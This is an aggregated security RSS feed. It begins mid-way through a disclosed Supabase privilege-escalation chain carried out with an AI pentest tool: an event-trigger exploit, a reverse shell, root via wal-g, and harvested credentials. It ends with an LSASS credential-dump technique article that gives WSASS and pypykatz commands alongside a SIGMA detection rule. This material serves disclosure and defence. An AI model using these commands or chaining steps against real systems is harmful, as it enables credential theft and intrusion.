it.The security check in  looks like this:But Hacktron pointed out an interesting extension, , containing an after-create script that temporarily makes the  user a superuser to perform an ownership change. The code below is from the  after-create script.Looking at the code we can see. In the brief window when the script elevates  to  [1], it executes ALTER FOREIGN DATA WRAPPER [2], and then revokes privileges [3] for both the session user () and the trigger owner () simultaneously. Leading to the obvious question: “Can we run arbitrary SQL during that brief window (between [1] and [3]) of escalated privileges?”Typically, to answer that, I’d start digging through PostgreSQL’s obscure documentation for hours or even days to see whether there’s any way to race the system and slip in execution during that short window. But recently, with Hacktron AI, the process was much more efficient.Now, my first move was to open an interactive Hacktron CLI session and ask for possible attack paths related to that race condition. It flagged many but event triggers stood out. Specifically, event triggers that fire after DDL events looked promising. I hadn’t heard of event triggers before, but after skimming the docs and asking the CLI to explain them, I realized this is probably what I was looking for. And the plan was clear.Now we just need to ask Hacktron CLI to generate PoC to install  extension and create a malicious event trigger, configured to fire on Data Definition Language (DDL) commands like ALTER FOREIGN DATA WRAPPER. The trigger will execute a function that creates a new superuser  role for us.To sum up, we install the  extension which does the following things:Our session is elevated to  by .The setup script runs, and the  user is also made a superuser.The alter foreign data wrapper command runs, and our trigger fires.The  security hook is called to inspect the trigger. It asks two questions:
Is the current session a superuser? (Yes, it’s .)Is the trigger’s code owned by a superuser? (Yes, it is owned by , who is currently a superuser.)Our function executes as .The  user is rolled back to .Our debug logs from a custom build of  confirmed the state at the time of the exploit:As shown above, function_is_owned_by_super evaluates to , causing the check to pass and allowing the trigger to run and causing a privilege escalation.Shell Access via With a Postgres superuser role , we can get shell on the DB instances.After switching to our new role, we asked Hacktron to come up with and execute a one-line reverse shell SQL payload. These aren’t particularly complicated tasks — typically, the manual process would involve reading Postgres docs or a CTF writeup to craft a PoC. But with Hacktron, it simply makes that process faster and streamlined, and we don’t need to leave the terminal and spend time reading docs.By executing this SQL statement with our new privileged role, we got an interactive shell on the database instance.At this point, we had shell access, but on an instance we controlled ourselves. I performed reconnaissance as the  user, searching for misconfigurations or sensitive data, but initially came up empty.The low privileged user was hardened with network isolation between db instances, cloud misconfigurations that allow pivot to cloud, and obvious privilege escalation issues.To recap, our attack chain so far:  ->  user -> superuser -> shell access as . We hit a wall for sometime as nothing immediately exploitable appeared with this level of access. The logical next step was privilege escalation to root, hoping to uncover something more valuable at that level.Local Privilege Escalation to RootAfter spending a lot of time, we decided to review all the suid binaries and figure out if any of them could allow us to escalate to root. In the reverse shell, we let Hacktron CLI do our recon easily in the box. Why bother copy-pasting commands, when you can describe what you want to do and let Hacktron execute the commands?It reported many binaries, one of them being an interesting SUID binary named , owned by root. I didn’t know what that binary was, but it’s kind of crazy that the latent space has information on . It identified it as “a popular open-source archival and restoration tool for PostgreSQL.” That immediately smelled like file read/write primitives to me. The small description from Hacktron allowed us to quickly filter out the interesting binaries to look at and cut down time reviewing each single suid binary.We cloned the wal-g repo and started reviewing its source code with Hacktron CLI,, we found, as guessed, that this binary had primitives to allow read/write files via S3 buckets. Now we just need to find a file which we could write that allows us to escalate to root.However, most of the filesystem inside the instance was read-only, and we couldn’t overwrite critical files. We tried to overwrite , modify the cron jobs, change the  path, and update the  binary, but everything is mounted read-only.Luckily, after some thinking, we used the file write primitives of  to write our SSH public key to the  user’s  file as the  was already written; however SSH configuration allows  as valid keys file as well, granting us persistent root access via SSH.After gaining root access, I found myself in a maze with no clear direction. I spent hours exploring various paths, trying different approaches.Since I had the Hacktron session stored, I could simply ask the CLI to summarize everything we did together that night. Rather than attempting to reconstruct hours of exploration from memory, I’ll let Hacktron walk you through what happened, because I’m lazy, and unlike an LLM, I don’t have a perfect photographic memory.Yeah, the breakthrough came while looking into S3 buckets that are accessible. After exploring accessible S3 buckets, and reading tons of buckets which are used to setup the instance, we discovered configuration archives containing deployment scripts and hardcoded credentials for infrastructure orchestration systems.These credentials would have provided access to orchestration systems managing database instances. The deployment script containing the credentials also gave the internal service URLs giving us an idea how to communicate with the service.To validate if these credentials were valid, I asked Hacktron to generate a script that tries to log in to the orchestration API.Running the script generated by Hacktron, we successfully authenticated to the service granting us administrative access to orchestration systems managing database instances.We immediately stopped escalating and running any dangerous commands via API, and reported the issue in Slack on Sunday with the help of Lovable’s security team.Later, the Supabase team notified us that these credentials only provided access to instances running on deprecated infrastructure that was already being phased out. The scope of impact was limited to this legacy system.The Privilege Escalation FixSupabase patched the vulnerability by adding a new, critical condition:This new check, current_role_oid != fattrs.owner, directly solves the problem. Let’s re-examine the state inside the hook during our exploit, but with the new logic:The session user () is .The function’s effective owner () appears to be .The condition current_role_oid != fattrs.owner evaluates to , because  is not .The condition  is also .Therefore, the entire expression (current_role_oid != fattrs.owner && role_is_super) becomes .Because one side of the  is now , the overall condition is met, and  is called. The trigger is correctly skipped. This enforces a strict new rule: a superuser can only execute event triggers that they personally own. It’s no longer enough for the function to be superuser-owned; it must be owned by the  superuser running the session, breaking the exploit chain at its source.Infrastructure Security ImprovementsIn addition to the database fixes, Supabase implemented several infrastructure security improvements:Access to infrastructure management APIs was fully disabled for database instances.Network-level restrictions were implemented as an additional safety measure.Credentials found in configuration files were rotated.S3 bucket permissions were reviewed and restricted.The Supabase team was quick to respond and patched the vulnerability within a day.Hacktron found the database privilege escalation vulnerabilityHacktron found the host local privilege escalation vulnerabilityHacktron confirmed access to infrastructure management systemsReported to Supabase and Lovable teams via Slack connectSupabase team acknowledged the severity of the issue and asked us to not try anything further.Orchestration systems API no longer accessible via hosts.Further postgres image hardening and Supautils fixes.Supabase awarded us with  bounty.Conclusion and Key TakeawaysThis research highlights how a single, subtle bug in a core component can be chained with other misconfigurations, such as an SUID binary and cloud misconfiguration, to dismantle the security boundaries of a multi-tenant cloud environment.It’s important to again note that this vulnerability chain only affected a very small number of instances on a deprecated infrastructure version that was already scheduled for upgrade. Supabase’s modern infrastructure was not vulnerable to this attack chain, and the affected instances were quickly secured.: While each individual vulnerability might seem minor, chaining them together had a significant impact. This demonstrates why layered security is crucial.Responsible Disclosure Works: The rapid response from Supabase, patches within 24 hours, shows the value of collaborative security research and responsible disclosure.The Power of AI-Accelerated Research: Crucially, AI-driven automation dramatically accelerated the discovery and validation process. Rather than replacing human judgment, AI multiplied it: automating hypothesis validation, surfacing likely attack paths from noisy reconnaissance dump, and speeding exploit generation tasks so the research team could iterate far faster than by manual hunting alone. That velocity cut days of manual reconnaissance down to hours, letting the team confirm impact and coordinate a fix before the window widened. The goal now is to democratize the same speed to everyone. Hacktron wants to bring this level of automated, AI-assisted detection and validation into security teams’ toolkits, so defenders can find and remediate complex chained issues before attackers can stitch them together. Moving these capabilities into continuous testing, post-deployment validation, and incident playbooks will help reduce time-to-detect and time-to-fix, and narrow the window of opportunity for real-world abuse.Book a call with us at hacktron.ai if you’d like to learn more about our research and how we can help you find and fix vulnerabilities in your software.]]></content:encoded></item><item><title>ISC Stormcast For Wednesday, November 19th, 2025 https://isc.sans.edu/podcastdetail/9706, (Wed, Nov 19th)</title><link>https://isc.sans.edu/diary/rss/32500</link><author></author><category>threatintel</category><pubDate>Wed, 19 Nov 2025 02:00:03 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>I analyzed Python packages that can be abused to build surveillance tools — here’s what I found</title><link>https://audits.blockhacks.io/audit/python-packages-to-create-spy-program</link><author>/u/kryakrya_it</author><category>netsec</category><pubDate>Wed, 19 Nov 2025 00:26:42 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Anatomy of an Akira Ransomware Attack: When a Fake CAPTCHA Led to 42 Days of Compromise</title><link>https://unit42.paloaltonetworks.com/fake-captcha-to-compromise/</link><author>Jeremy Brown</author><category>threatintel</category><enclosure url="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/11/07-9-Howling-Scorpius-1920x900-1.png" length="" type=""/><pubDate>Wed, 19 Nov 2025 00:00:01 +0000</pubDate><source url="https://unit42.paloaltonetworks.com/">Unit 42</source><content:encoded><![CDATA[Unit 42 outlines a Howling Scorpius attack delivering Akira ransomware that originated from a fake CAPTCHA and led to a 42-day compromise.]]></content:encoded></item><item><title>Operational Cyber Threat Intelligence</title><link>https://www.recordedfuture.com/blog/operational-cyber-threat-intelligence</link><author></author><category>threatintel</category><enclosure url="https://www.recordedfuture.com/blog/media_190a9f903d9fbd7b56c2e00fd894596d5b7793258.png?width=1200&amp;format=pjpg&amp;optimize=medium" length="" type=""/><pubDate>Wed, 19 Nov 2025 00:00:00 +0000</pubDate><source url="https://www.recordedfuture.com/">Recorded Future</source><content:encoded><![CDATA[The average organization today relies on multiple platforms and tools delivering round-the-clock feeds of security information and alerts. Under this deluge of data, many organizations find themselves struggling to actually make sense of, let alone use of, all this information.Recorded Future offers a concrete threat intelligence maturity journey organizations can follow in order to evolve from this reactive state of intelligence overload, to a more value-added state. The four stages of this journey include: Reactive, Proactive, Predictive, and Autonomous.Along the course of this journey, organizations will take clear steps to go from responding to threats after detection, to preventing known threats, all the way to using automation to self-direct threat responses with minimal human interventionPlatforms like Recorded Future provide the data, context, and automation to accelerate your journey toward operational cyber threat intelligence maturity.The Information Overload Problem: Why More isn’t Always BetterYour security operations center (SOC) runs multiple threat intelligence feeds around the clock. Hundreds of alerts pour in daily—indicators of compromise (IOCs), suspicious IP addresses, emerging vulnerabilities, and more. Yet despite all this data, the team still spends much of its day reacting to alerts, rather than staying ahead of threats. Valuable data is stored, analyzed, and even given high visibility, but rarely acted upon in time to make a difference.This is the information overload problem, and it’s widening the gap between information and action. Organizations collect and subscribe to vast quantities of threat data from multiple sources, but few have the threat intelligence capabilities—the processes, integrations, and automation—required to add context to all that data and transform it into measurable security outcomes.The problem isn’t the data itself. It’s the operationalization of it. That is to say, the ability to use threat data efficiently, contextually, and predictively across the security ecosystem. As Recorded Future highlights in its , most organizations are somewhere along a journey toward maturity, moving from purely reactive intelligence to fully autonomous operations.This post explores that path, offering a practical roadmap for transforming raw alerts into operational cyber threat intelligence. Using the four stages of maturity (i.e. Reactive, Proactive, Predictive, and Autonomous) we’ll show how organizations can evolve their security programs from putting out fires to acting with foresight.The Threat Intelligence Maturity Model: From Reactive to AutonomousThreat intelligence isn’t a binary capability. It exists on a continuum. As organizations gain visibility, automation, and analytical depth, their approach to threat intelligence evolves. Recorded Future’s  defines this journey in four stages:: Responding to threats after detection.: Preventing known threats before impact.: Anticipating threats before they materialize.: Enabling self-directing, intelligence-led defense at machine speed.Each stage represents a significant leap in capability, mindset, and operational efficiency. Progress along this path requires more than just technology. It depends equally on people, processes, and the integration of intelligence into everyday decision-making.In the sections that follow, we’ll explore what defines each stage, common challenges, measurable KPIs, and key actions to help organizations advance their threat intelligence operations.Stage 1: Reactive—Responding to What’s Already HappenedThis stage is typical for teams suffering from alert fatigue or lacking dedicated threat intelligence personnel. Intelligence feeds may be connected to security tools, but without clear processes, much of that data sits unutilized.Characteristics of a Reactive OrganizationFocused on detection and containment.Success means closing incidents, not necessarily preventing them.However, this stage is where the foundation for maturity is built.Pain Points and ChallengesOverload without insight: Teams receive too many alerts to analyze effectively.Siloed tools and workflows: Intelligence isn’t integrated across the stack.Limited automation: Manual lookups and enrichment dominate response time.High dwell time: Threats are detected after the fact, often too late for meaningful containment.Centralize intelligence feeds into a single operational view.Automate enrichment of alerts with high-confidence threat indicators.Establish workflows for classifying, triaging, and escalating alerts based on context.Begin correlating IOCs with known campaigns or adversary tactics.Success Indicators and KPIsAcross the industry, certain standards, KPIs and other measures have emerged to help orient and assess one’s progress through each stage of the maturity journey. For the Reactive stage, these include:Reduction in duplicate or “known bad” alerts.Decrease in manual investigations per analyst.Improved Mean Time to Triage (MTTT): faster analysis of known threats.Greater integration between intelligence feeds and alert management.The Reactive stage is about laying the groundwork for operationalized intelligence, consolidating data and reducing noise so analysts can focus on meaningful threats. Once teams can respond consistently and efficiently, they’re ready to evolve toward a proactive posture.Stage 2: Proactive—Preventing Known ThreatsThe Proactive stage marks a crucial transition from reacting to known events to actively preventing them. Here, organizations begin to enrich alerts with context, prioritize risk, and use intelligence to inform vulnerability management and threat hunting.Teams at this stage have moved beyond basic detection. They use intelligence to drive decision-making, asking “What matters most to us?” instead of simply responding to what the feeds say.Characteristics of a Proactive OrganizationSecurity teams conduct regular threat hunting exercises to identify indicators of compromise before alerts fire.Vulnerability management programs are intelligence-led, prioritizing patches based on real-world exploitation trends.Analysts can articulate threat actor behaviors and motivations, not just indicators.Intelligence is beginning to inform executive-level reporting and risk assessments.Pain Points and ChallengesContext overload: Adding intelligence without prioritization can still create noise.Scaling analysis: Manual research can’t keep up with threat volume.Communication gaps: Intelligence insights may not reach decision-makers fast enough.Integrate enrichment and context directly into alert workflows.Use intelligence to prioritize vulnerabilities being actively exploited in the wild.Establish a repeatable threat hunting process tied to known tactics, techniques and procedures (TTPs).Create basic reporting dashboards to show intelligence-driven outcomes to leadership.Success Indicators and KPIsAs outlined above, industry best practices and our own internal expertise has helped to inform clear indicators of success and measurable KPIs to help you traverse this stage:Further reduction in Mean Time to Respond (MTTR) and faster full-cycle incident resolution.Increase in incidents identified through proactive hunting.Decrease in unpatched, high-risk vulnerabilities.More consistent cross-departmental sharing of intelligence insights.Proactive organizations are no longer purely reactive responders; they are early detectors. They use operational cyber threat intelligence to stop known attacks before they strike, ridging the gap between detection and prevention.Stage 3: Predictive—Anticipating What’s NextAt the Predictive stage, organizations transform from defenders into forecasters. Intelligence isn’t just about identifying active threats. It’s about anticipating what adversaries will do next.Predictive intelligence uses advanced analytics, automation, and pattern recognition to reveal emerging campaigns, shifting tactics, and vulnerabilities before they’re exploited. At this stage, intelligence becomes strategic, influencing not just SOC operations but enterprise-wide risk management and planning.Characteristics of a Predictive OrganizationSecurity and risk teams share a unified intelligence strategy.Machine learning and AI tools help identify evolving threat trends.Insights extend beyond cyber to supply chain, digital risk, and geopolitical factors.The organization uses predictive intelligence to guide security investment decisions.Pain Points and ChallengesData interpretation: Turning predictive signals into actionable decisions.Cross-functional alignment: Intelligence must inform departments beyond security (legal, procurement, communications).Maintaining analyst trust in automation, ensuring predictive systems remain transparent and explainable.Combine internal telemetry with external intelligence for a 360° threat view.Monitor emerging TTPs and map them to organizational exposures.Develop scenario-based playbooks informed by predictive analysis.Use predictive insights to shape security budgets and executive strategy.Success Indicators and KPIsSignificant reduction in average dwell time (threats neutralized before causing damage).Overall percentage of threats mitigated before exploitation.Increased accuracy of threat forecasting.Improved strategic alignment between security and business objectives.The Predictive stage represents the maturation of threat intelligence operations. Security becomes a forward-looking function—one that can anticipate risk and shape outcomes, rather than merely react and respond to them.Stage 4: Autonomous—Intelligence at Machine SpeedThe Autonomous stage represents the pinnacle of operational cyber threat intelligence maturity. At this point, intelligence systems and AI-driven automation operate continuously: detecting, analyzing, and responding to threats with minimal human intervention.Here, human analysts focus on strategic research, oversight, and long-term planning while machines handle routine detection and response. Intelligence is fully operationalized, driving every aspect of the security ecosystem in real time.Characteristics of an Autonomous OrganizationThreat intelligence is deeply integrated across all systems and workflows.AI and automation enable continuous detection and response without manual triggers.The organization has global visibility into digital, third-party, and geopolitical risks.Threat intelligence is recognized as a strategic business differentiator.Pain Points and ChallengesGovernance and oversight: Ensuring automated decisions remain transparent and aligned with policy.Cultural adaptation: Building trust in autonomous operations among leadership and analysts.Optimization: Continuously tuning models and workflows for performance and precision.Expand autonomous intelligence integration across the full security stack.Enable continuous enrichment of intelligence data for context-aware decision-making.Automate rule creation and response playbooks based on live threat insights.Use AI to generate executive-level summaries and automated intelligence reporting.Success Indicators and KPIsHigh rate of automated response actions.Continuous reduction in dwell time.Consistent threat mitigation without human escalation.Cross-functional visibility and reporting of intelligence outcomes.In the Autonomous stage, the line between intelligence and action disappears. Security operations are intelligence-led and self-improving, creating a closed-loop system that operates at the same speed as the adversaries it defends against.Fueling the Engine: How Intelligence Powers Every StageProgression through these maturity stages depends on the quality, breadth, and automation of the underlying intelligence platform. Recorded Future’s ecosystem exemplifies this principle—providing comprehensive data, contextual insights, and machine-speed automation to advance organizations along the maturity curve.Primary Intelligence FocusHigh-confidence indicator feeds (IPs, domains, hashes).Faster triage and response to known threats.Context-rich intelligence: vulnerability data, actor profiles, and exploit trends.Prioritized patching and early threat detection.Strategic insights: TTPs, campaign monitoring, and predictive modeling.Anticipation of future threats and informed investments.Always-on AI-driven analysis and automation.Continuous detection, response, and operational resilience.At every stage, operational cyber threat intelligence is both the fuel and the framework for progress. It informs decisions, shapes response playbooks, and empowers organizations to act faster, smarter, and with greater confidence.Your Next Move on the Journey to Operational Intelligence MaturityOperationalizing threat intelligence is not a single milestone, it’s a journey. Each stage builds upon the last, requiring time, structure, and deliberate investment in people, process, and intelligence integration. Just like a human learning to crawl, walk, run, and sprint, the journey towards maturity is rich with both challenges and rewards.The key is honest assessment:Are you still chasing alerts in a reactive, ad hoc fashion?Have you begun to anticipate known threats through proactive hunting and prioritization?Are you using predictive analytics to anticipate emerging risks?Or have you reached autonomous operations, where intelligence drives decisions at machine speed?Wherever you are today, your next move determines how effectively your organization can predict, prevent, and protect against tomorrow’s threats.Whether you’re integrating your first intelligence feed or orchestrating fully autonomous threat response, Recorded Future provides the data, context, and automation to accelerate your journey toward operational cyber threat intelligence maturity.]]></content:encoded></item><item><title>Thunderbird adds native support for Microsoft Exchange accounts</title><link>https://www.bleepingcomputer.com/news/software/thunderbird-adds-native-support-for-microsoft-exchange-accounts/</link><author>Bill Toulas</author><category>security</category><pubDate>Tue, 18 Nov 2025 22:09:32 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Thunderbird 145 has been released with full native support for Microsoft Exchange email via the Exchange Web Services (EWS) protocol. [...]]]></content:encoded></item><item><title>From bad to worse: Doctor Alliance hacked again by same threat actor (1)</title><link>https://databreaches.net/2025/11/18/from-bad-to-worse-doctor-alliance-hacked-again-by-same-threat-actor/?pk_campaign=feed&amp;pk_kwd=from-bad-to-worse-doctor-alliance-hacked-again-by-same-threat-actor</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 18 Nov 2025 21:11:21 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>New ShadowRay attacks convert Ray clusters into crypto miners</title><link>https://www.bleepingcomputer.com/news/security/new-shadowray-attacks-convert-ray-clusters-into-crypto-miners/</link><author>Bill Toulas</author><category>security</category><pubDate>Tue, 18 Nov 2025 20:56:00 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[A global campaign dubbed ShadowRay 2.0 hijacks exposed Ray Clusters by exploiting an old code execution flaw to turn them into a self-propagating cryptomining botnet. [...]]]></content:encoded></item><item><title>Windows 11 gets new Cloud Rebuild, Point-in-Time Restore tools</title><link>https://www.bleepingcomputer.com/news/microsoft/windows-11-gets-new-cloud-rebuild-point-in-time-restore-tools/</link><author>Lawrence Abrams</author><category>security</category><pubDate>Tue, 18 Nov 2025 19:29:52 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft announced two new Windows 11 recovery features today at the Ignite developer conference, called Cloud Rebuild and Point-in-Time Restore (PITR), that aim to reduce downtime and make it easier to recover from system failures or faulty updates. [...]]]></content:encoded></item><item><title>Fortinet warns of new FortiWeb zero-day exploited in attacks</title><link>https://www.bleepingcomputer.com/news/security/fortinet-warns-of-new-fortiweb-zero-day-exploited-in-attacks/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Tue, 18 Nov 2025 19:01:39 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Today, Fortinet released security updates to patch a new FortiWeb zero-day vulnerability that threat actors are actively exploiting in attacks. [...]]]></content:encoded></item><item><title>Sneaky 2FA Phishing Kit Adds BitB Pop-ups Designed to Mimic the Browser Address Bar</title><link>https://thehackernews.com/2025/11/sneaky-2fa-phishing-kit-adds-bitb-pop.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUazxCy3vEGn8LPbdlF5itqaRkz1hHoZICRwrw6N6eOk7fxRbRx1r304KEpLd-LeevEHDIwZ0pLukHppiGlxuU5juewH86IWmXorHFekbgYxQ1R2snVoZE8tqkrFIg4HOu_EaIV5bmVYaad4wUYA2ea9tiqqKaYAfIzj2icwv50ptIREdEy1NS8jPwsLrj/s1600/browser.gif" length="" type=""/><pubDate>Tue, 18 Nov 2025 18:31:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The malware authors associated with a Phishing-as-a-Service (PhaaS) kit known as Sneaky 2FA have incorporated Browser-in-the-Browser (BitB) functionality into their arsenal, underscoring the continued evolution of such offerings and further making it easier for less-skilled threat actors to mount attacks at scale.
Push Security, in a report shared with The Hacker News, said it observed the use]]></content:encoded></item><item><title>Chrome zero-day under active attack: visiting the wrong site could hijack your browser</title><link>https://www.malwarebytes.com/blog/news/2025/11/chrome-zero-day-under-active-attack-visiting-the-wrong-site-could-hijack-your-browser</link><author></author><category>threatintel</category><pubDate>Tue, 18 Nov 2025 18:09:13 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Google has released an update for its Chrome browser that includes two security fixes. Both are classified as high severity, and one is reportedly exploited in the wild. These flaws were found in Chrome’s V8 engine, which is the part of Chrome (and other Chromium-based browsers) that runs JavaScript.Chrome is by far the world’s most popular browser, used by an estimated 3.4 billion people. That scale means when Chrome has a security flaw, billions of users are potentially exposed until they update.These vulnerabilities are serious because they affect the code that runs almost every website you visit. Every time you load a page, your browser executes JavaScript from all sorts of sources, whether you notice it or not. Without proper safety checks, attackers can sneak in malicious instructions that your browser then runs—sometimes without you clicking anything. That could lead to stolen data, malware infections, or even a full system compromise.That’s why it’s important to install these patches promptly. Staying unpatched means you could be open to an attack just by browsing the web, and attackers often exploit these kinds of flaws before most users have a chance to update. Always let your browser update itself, and don’t delay restarting to apply security patches, because updates often fix exactly this kind of risk.The Chrome update brings the version number to 142.0.7444.175/.176 for Windows, 142.0.7444.176 for macOS and 142.0.7444.175 for Linux. So, if your Chrome is on the version number  it’s protected from these vulnerabilities.The easiest way to update is to allow Chrome to update automatically, but you can end up lagging behind if you never close your browser or if something goes wrong—such as an extension stopping you from updating the browser.To update manually, click the “” menu (three stacked dots), then choose  > . If there is an update available, Chrome will notify you and start downloading it. Then relaunch Chrome to complete the update, and you’ll be protected against these vulnerabilities.Both vulnerabilities are characterized as “type confusion” flaws in V8.Type confusion happens when code doesn’t verify the object type it’s handling and then uses it incorrectly. In other words, the software mistakes one type of data for another—like treating a list as a single value or a number as text. This can cause Chrome to behave unpredictably and, in some cases, let attackers manipulate memory and execute code remotely through crafted JavaScript on a malicious or compromised website.The actively exploited vulnerability—Google says “an exploit for CVE-2025-13223 exists in the wild”—was discovered by Google’s Threat Analysis Group (TAG). It can allow a remote attacker to exploit heap corruption via a malicious HTML page. Which means just visiting the “wrong” website might be enough to compromise your browser.Google hasn’t shared details yet about who is exploiting the flaw, how they do it in real-world attacks, or who’s being targeted. However, the TAG team typically focuses on spyware and nation-state attackers that abuse zero days for espionage.The second vulnerability, tracked as CVE-2025-13224, was discovered by Google’s Big Sleep, an AI-driven project to discover vulnerabilities. It has the same potential impact as the other vulnerability, but cybercriminals probably haven’t yet figured out how to use it.Users of other Chromium-based browsers—like Edge, Opera, and Brave—can expect similar updates in the near future.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>Surveillance tech provider Protei was hacked, its data stolen, and its website defaced</title><link>https://databreaches.net/2025/11/18/surveillance-tech-provider-protei-was-hacked-its-data-stolen-and-its-website-defaced/?pk_campaign=feed&amp;pk_kwd=surveillance-tech-provider-protei-was-hacked-its-data-stolen-and-its-website-defaced</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 18 Nov 2025 17:44:49 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Microsoft to integrate Sysmon directly into Windows 11, Server 2025</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-to-integrate-sysmon-directly-into-windows-11-server-2025/</link><author>Lawrence Abrams</author><category>security</category><pubDate>Tue, 18 Nov 2025 17:25:18 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft announced today that it will integrate Sysmon natively into Windows 11 and Windows Server 2025 next year, making it unnecessary to deploy the standalone Sysinternals tools. [...]]]></content:encoded></item><item><title>LSASS Dump – Windows Error Reporting</title><link>https://ipurple.team/2025/11/18/lsass-dump-windows-error-reporting/</link><author>/u/netbiosX</author><category>netsec</category><pubDate>Tue, 18 Nov 2025 17:17:01 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[The Windows Error Reporting is a feature that is responsible for the collection of information about system and application crashes and reporting this information to Microsoft. Windows are shipped with the  binary that is used by the Windows Error Reporting service, and it is signed by Microsoft to collect reports when a critical process (application or system) is crashed. The binary runs with the Windows Trusted Computing Base (WinTCB) Protected Process Light (PPL) privileges to allow interaction with other processes running with similar privileges (PPL) such as LSASS.TwoSevenOneThree disclosed that the version of  (part of Windows 8.1) enables threat actors to perform memory dump from PPL processes in a non-encrypted form. Therefore, it could be used to retrieve credentials from the LSASS process by generating a MiniDump file.The Windows process LSASS manages the authentication and credential information. Historically, the process was a target for threat actors to retrieve hashes and credentials in plain text to facilitate lateral movement activities. Endpoint Detection and Response systems have raised the bar towards credential dumping via LSASS. Any activity that interacts with this process most likely triggers an alert. In modern versions of Windows, the LSASS process is protected by PPL to prevent unauthorised interaction with the memory region unless kernel level privileges have been obtained or the interaction is performed from another process running as PPL.The  binary is signed by Microsoft and it is stored in the following Windows paths:C:\Windows\System32
C:\Windows\SysWOW64The dump file that is written on the disk during legitimate application crashes is stored encrypted. However, in the version of Windows 8.1 the binary permits the storage of the crash dump in a non-encrypted form. The tool WSASS needs to be used in conjunction with the older version of the  binary to dump the memory of the LSASS process. Specifically, the tool performs the following steps:Executes the WerFaultSecure binary with PPL protection at the WinTCB levelReplaces the dump file magic header with the PNG magic header to prevent file deletionRestores the normal operation of the LSASS processThe following diagram demonstrates the steps of LSASS credential dumping via the Windows Error Reporting.The tool requires the path of the  binary and the process ID of LSASS.shell WSASS.exe "C:\Users\Ian\Downloads\WerFaultSecure.exe" 796The MiniDump file is stored as image in a PNG format. The tool applies the PNG header to evade detection. The file could be exfiltrated for offline analysis.The first four bytes of the header MiniDump are:Hex: 4D 44 4D 50
ASCII: M D M PWith the usage of a hex editor the PNG header should be replaced with the MiniDump header.The contents of the dump could be examined via Mimikatz or any other variation such as pypykatz.pypykatz lsa minidump proc.pngIt should be noted that the technique works on Windows 10 and Windows 11 environments. However, due to credential guard implementation in Windows 11, the information that a threat actor could retrieve is limited. The high value secrets that the LSASS process used to store in its own memory have been moved into an isolated process (LSAIso.exe).The following playbook could be used to emulate the technique of LSASS dump via the Windows Error Reporting binary.[[Playbook.Windows Error Reporting]]
id = "1.0.0"
name = "1.0.0 - Windows Error Reporting"
description = "LSASS Process Dump via Windows Error Reporting"
tooling.name = "WSASS"
tooling.references = [
    "https://github.com/TwoSevenOneT/WSASS"
]
executionSteps = [
    "shell WSASS.exe "<path-to-WerFaultSecure.exe>" <lsass-PID>"
]
executionRequirements = [
    "Local Administrator"
]
The technique of dumping credentials cached in LSASS via the Windows Error Reporting binary provides multiple detection opportunities. It is recommended, SOC teams to investigate if their current EDR provides detection coverage especially on the behaviour level and if not enable additional logging such as Process and File Creation.Dumping the memory of LSASS via the old version of the binary  binary creates new process if the tool is executed from a console (command prompt or PowerShell) or by issuing the  command from a Command-and-Control framework (Havoc). Windows environments by default doesn’t capture process creation events. SOC teams should investigate whether it is feasible to enable Process Creation in their environments due to the volume of logs that will be generated. It should be noted that Endpoint Detection and Response systems should be also able to capture new processes. From the Group Policy the  setting is responsible to track new processes. Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Detailed TrackingThe technique requires the WSASS binary to be executed under the context of an elevated account (Local Administrator). Execution of the binary will generate a new process under the name WSASS.During the execution, the  process attempts to invoke the  binary. From defensive point of view a child process will be created under the same name. Furthermore, it should be considered an anomaly if the  process is initiated from a non-system path and has as parent the WSASS.The following SIGMA rule can detect executions of the  binary from paths outside of System32 and SysWOW64. Since the technique requires local administrator privileges, threat actors could overwrite the existing binary and initiate the execute from System32 to blend in. SOC teams should not rely only their detections on the executed path but should correlate this information with additional data sources during threat hunting. title: WerFaultSecure.exe executed outside system paths
id: b2b2c8b0-7c1e-4c0c-8f7d-tg9p
status: experimental
description: Detection of WerFaultSecure binary outside of system paths
author: Panos Gkatziroulis
date: 2025/11/17
logsource:
  product: windows
  category: process_creation
detection:
  selection_image:
    Image|endswith: '\WerFaultSecure.exe'
  filter_system_paths:
    Image|startswith:
      - 'C:\Windows\System32\'
      - 'C:\Windows\SysWOW64\'
  condition: selection_image and not filter_system_paths
level: high
tags:
  - attack.t1003.001
  - defense-evasion.lolbin
Sysmon offers additional visibility on Process Creation events as it doesn’t only capture the process name and ID but also the command line arguments. Investigation of the command line field can disclose the arbitrary execution. Sysmon capture process creation events under Event ID 1.The WSASS tool passes undocumented arguments to the  binary that performs the dump of the LSASS process. These arguments are visible during code review of the tool:std::wstringstream cmd;
cmd << werPath
<< L" /h"
<< L" /pid " << targetPID
<< L" /tid " << targetTID
<< L" /file " << HandleToDecimal(hDump)
<< L" /encfile " << HandleToDecimal(hEncDump)
<< L" /cancel " << HandleToDecimal(hCancel)
